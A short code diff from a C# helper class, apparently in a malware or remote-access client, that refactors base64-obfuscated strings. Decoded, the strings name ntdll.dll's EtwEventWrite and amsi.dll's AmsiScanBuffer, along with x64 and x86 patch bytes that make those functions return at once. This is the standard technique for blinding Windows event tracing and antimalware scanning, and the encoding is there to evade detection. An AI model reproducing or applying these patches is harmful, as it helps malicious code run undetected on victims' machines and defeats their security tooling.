@@ -122,53 +122,44 @@ namespace Client.Helper
             return input.Replace(obfuscationPattern, "");
         }
 
-        private static string _obfuscatedNameDllEtw = Obfuscate("bnRkbGwuZGxs");
-        private static string obfuscatedFonctionDllEtw = Obfuscate("RXR3RXZlbnRXcml0ZQ==");
-        private static string obfuscatedX64PatchDllEtw = Obfuscate("SDPAww==");
-        private static string obfuscatedX86PatchDllEtw = Obfuscate("M8DCFAA=");
-        private static string obfuscatedNameDllAmsi = Obfuscate("YW1zaS5kbGw=");
-        private static string obfuscatedFonctionDllAmsi = Obfuscate("QW1zaVNjYW5CdWZmZXI=");
-        private static string obfuscatedX64PatchSllAmsi = Obfuscate("uFcAB4DD");
-        private static string obfuscatedX86PatchSllAmsi = Obfuscate("uFcAB4DCGAA=");
-
         public static string NameDllEtw()
         {
-            return Deobfuscate(_obfuscatedNameDllEtw);
+            return Deobfuscate(Obfuscate("bnRkbGwuZGxs"));
         }
 
         public static string FonctionDllEtw()
         {
-            return Deobfuscate(obfuscatedFonctionDllEtw);
+            return Deobfuscate(Obfuscate("RXR3RXZlbnRXcml0ZQ=="));
         }
 
         public static string X64PatchDllEtw()
         {
-            return Deobfuscate(obfuscatedX64PatchDllEtw);
+            return Deobfuscate(Obfuscate("SDPAww=="));
         }
 
         public static string X86PatchDllEtw()
         {
-            return Deobfuscate(obfuscatedX86PatchDllEtw);
+            return Deobfuscate(Obfuscate("M8DCFAA="));
         }
 
         public static string NameDllAmsi()
         {
-            return Deobfuscate(obfuscatedNameDllAmsi);
+            return Deobfuscate(Obfuscate("YW1zaS5kbGw="));
         }
 
         public static string FonctionDllAmsi()
         {
-            return Deobfuscate(obfuscatedFonctionDllAmsi);
+            return Deobfuscate(Obfuscate("QW1zaVNjYW5CdWZmZXI="));
         }
 
         public static string X64PatchSllAmsi()
         {
-            return Deobfuscate(obfuscatedX64PatchSllAmsi);
+            return Deobfuscate(Obfuscate("uFcAB4DD"));
         }
 
         public static string X86PatchSllAmsi()
         {
-            return Deobfuscate(obfuscatedX86PatchSllAmsi);
+            return Deobfuscate(Obfuscate("uFcAB4DCGAA="));
         }
     }
 
